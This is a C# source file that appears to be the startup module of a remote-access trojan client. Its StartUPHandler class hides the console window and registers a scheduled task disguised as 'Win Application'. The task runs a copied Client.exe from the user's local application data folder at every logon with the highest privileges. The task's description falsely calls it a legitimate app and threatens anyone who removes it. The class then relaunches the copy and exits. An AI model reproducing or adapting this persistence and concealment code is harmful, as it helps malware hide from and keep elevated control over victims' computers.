using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32.TaskScheduler;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using Client;
using Client.Commands;
using System.IO;
namespace Client.Commands
{

    public class StartUPHandler
    {

        public readonly string FinalDestination;
        public readonly string OrginalDestination;
        public readonly string Filename;

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        public static extern Boolean ShowWindow(IntPtr hwnd, int nCmdShow);



        public StartUPHandler() {
            this.Filename = "Client.exe";
            this.OrginalDestination = Environment.CurrentDirectory + @"\" + AppDomain.CurrentDomain.FriendlyName;
            this.FinalDestination = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\" + this.Filename;


        }

        public void AddTOStartUp(){

            using (TaskService s = new TaskService())
            {
                TaskDefinition d = s.NewTask();
                d.RegistrationInfo.Description = " this a legtmiate app dont remove it or you will die ";
                d.Triggers.Add(new LogonTrigger());
                d.Actions.Add(new ExecAction(this.FinalDestination, "", this.FinalDestination.Remove(this.FinalDestination.Length-this.Filename.Length, this.Filename.Length) ));
                d.Principal.RunLevel = TaskRunLevel.Highest;
                s.RootFolder.RegisterTaskDefinition("Win Application", d);

            }
        
        }
        public bool IsFileExistis(){

            return this.FinalDestination == this.OrginalDestination;
        }

        public void HideWindow()
        {

            ShowWindow(GetConsoleWindow(), 0);


        }
        public void moveRunningWindow()
        {
            //File.Move(this.OrginalDestination, this.FinalDestination);
            //File.Move(this.OrginalDestination, this.FinalDestination);
           
            Process.Start(this.FinalDestination);
            Environment.Exit(0);


        }
    }
}
